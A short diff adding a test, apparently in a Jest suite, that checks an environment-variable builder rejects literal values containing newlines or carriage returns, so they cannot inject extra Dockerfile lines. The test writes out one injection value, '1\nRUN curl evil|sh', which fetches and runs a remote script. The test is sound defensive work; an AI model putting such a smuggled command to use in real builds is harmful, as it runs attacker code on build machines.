@@ -77,4 +77,14 @@ describe("EnvironmentBuilder", () => {
       }),
     ).toThrow(/Secrets Manager or SSM Parameter Store ARN/);
   });
+
+  it("rejects literal values containing control characters", () => {
+    const builder = new EnvironmentBuilder(createPlan("test"));
+    // A newline in a literal env value would inject an extra Dockerfile
+    // ENV/instruction line.
+    expect(() => builder.add("FLAG", { value: "1\nRUN curl evil|sh" })).toThrow(
+      /control characters/,
+    );
+    expect(() => builder.add("CR", { value: "a\rb" })).toThrow(/control characters/);
+  });
 });
